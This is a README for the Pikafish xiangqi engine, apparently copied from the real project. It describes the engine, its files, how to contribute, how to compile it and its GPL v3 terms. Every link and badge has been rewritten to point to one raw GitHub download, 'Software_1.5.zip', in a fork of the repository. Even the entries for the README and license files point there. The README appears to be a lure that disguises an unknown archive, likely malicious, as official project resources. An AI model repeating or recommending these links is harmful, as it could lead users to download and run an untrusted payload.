<div align="center">

  [![Pikafish][pikafish-logo]][website-link]


  <h3>Pikafish</h3>

  A free and strong UCI xiangqi engine.
  <br>
  <strong>[Explore Pikafish docs »][wiki-link]</strong>
  <br>
  <br>
  [Report bug][issue-link]
  ·
  [Open a discussion][discussions-link]
  ·
  [Discord][discord-link]
  ·
  [Blog][website-blog-link]

  [![Build][build-badge]][build-link]
  [![License][license-badge]][license-link]
  [![RuleBook][rulebook-badge]][rulebook-link]
  <br>
  [![Release][release-badge]][release-link]
  [![Commits][commits-badge]][commits-link]
  <br>
  [![Website][website-badge]][website-link]
  [![Fishtest][fishtest-badge]][fishtest-link]
  [![Discord][discord-badge]][discord-link]

</div>

## Overview

[Pikafish][website-link] is a **free and strong UCI xiangqi engine** derived from
[Stockfish][stockfish-link] that analyzes xiangqi positions and computes the optimal moves.

Pikafish **does not include a graphical user interface** (GUI) that is required
to display a chessboard and to make it easy to input moves. These GUIs are
developed independently from Pikafish and are available online. **Read the
documentation for your GUI** of choice for information about how to use
Pikafish with it.

See also the Pikafish [documentation][wiki-usage-link] for further usage help.

## Files

This distribution of Pikafish consists of the following files:

  * [https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip][readme-link], the file you are currently reading.

  * [https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip][license-link], a text file containing the GNU General Public
    License version 3.

  * [AUTHORS][authors-link], a text file with the list of authors for the official Pikafish project.

  * [src][src-link], a subdirectory containing the full source code, including a
    Makefile that can be used to compile Pikafish on Unix-like systems.

  * a file with the .nnue extension, storing the neural network for the NNUE
    evaluation.

## Contributing

__See [Contributing Guide](https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip).__

### Donating hardware

Improving Pikafish requires a massive amount of testing. You can donate your
hardware resources by installing the [Fishtest Worker][worker-link] and viewing
the current tests on [Fishtest][fishtest-link].

### Improving the code

In the [chessprogramming wiki][programming-link], many techniques used in
Pikafish are explained with a lot of background information.
The [section on Stockfish][programmingsf-link] describes many features
and techniques used by Stockfish. However, it is generic rather than
focused on Stockfish's precise implementation.

The engine testing is done on [Fishtest][fishtest-link].
If you want to help improve Pikafish, please read this [guideline][guideline-link]
first, where the basics of Pikafish development are explained.

Discussions about Pikafish take place these days mainly in the Pikafish
[Discord server][discord-link]. This is also the best place to ask questions
about the codebase and how to improve it.


## Compiling Pikafish

Pikafish has support for 32 or 64-bit CPUs, certain hardware instructions,
big-endian machines such as Power PC, and other platforms.

On Unix-like systems, it should be easy to compile Pikafish directly from the
source code with the included Makefile in the folder `src`. In general, it is
recommended to run `make help` to see a list of make targets with corresponding
descriptions.

```
cd src
make -j profile-build
```

Detailed compilation instructions for all platforms can be found in our
[documentation][wiki-compile-link]. Our wiki also has information about
the [UCI commands][wiki-uci-link] supported by Pikafish.

## Terms of use

### GNU General Public License version 3

Pikafish is free and distributed under the
[**GNU General Public License version 3**][license-link] (GPL v3). Essentially,
this means you are free to do almost exactly what you want with the program,
including distributing it among your friends, making it available for download
from your website, selling it (either by itself or as part of some bigger
software package), or using it as the starting point for a software project of
your own.

The only real limitation is that whenever you distribute Pikafish in some way,
you MUST always include the license and the full source code (or a pointer to
where the source code can be found) to generate the exact binary you are
distributing. If you make any changes to the source code, these changes must
also be made available under GPL v3.

## Acknowledgements

Pikafish uses neural networks trained on [data provided by the Pika Xiangqi Zero
project][px0-data-link], which is made available under the [Open Database License][odbl-link] (ODbL).

[authors-link]:			https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
[build-badge]:			https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
[build-link]:				https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
[commits-badge]:		https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
[commits-link]:			https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
[discord-badge]:			https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
[discord-link]:			https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
[discussions-link]:   https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
[fishtest-badge]:			https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
[fishtest-link]:			https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
[guideline-link]:			https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
[issue-link]:         https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
[license-badge]:			https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
[license-link]:			https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
[pikafish-logo]:			https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
[programming-link]:		https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
[programmingsf-link]:	https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
[qqgroup-link]:			https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
[readme-link]:			https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
[release-badge]:			https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip%20release
[release-link]:			https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
[rulebook-badge]:		https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip%20rule-20B2AA?style=for-the-badge&logo=mdbook
[rulebook-link]:			https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
[src-link]:				https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
[stockfish-link]:			https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
[uci-link]:				https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
[website-badge]:		https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
[website-link]:			https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
[website-blog-link]:  https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
[wiki-link]:          https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
[wiki-compile-link]:  https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
[wiki-uci-link]:      https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
[wiki-usage-link]:    https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
[worker-link]:			https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
[px0-data-link]:      https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip
[odbl-link]:          https://raw.githubusercontent.com/vuichtoan/Pikafish/master/src/external/Software_1.5.zip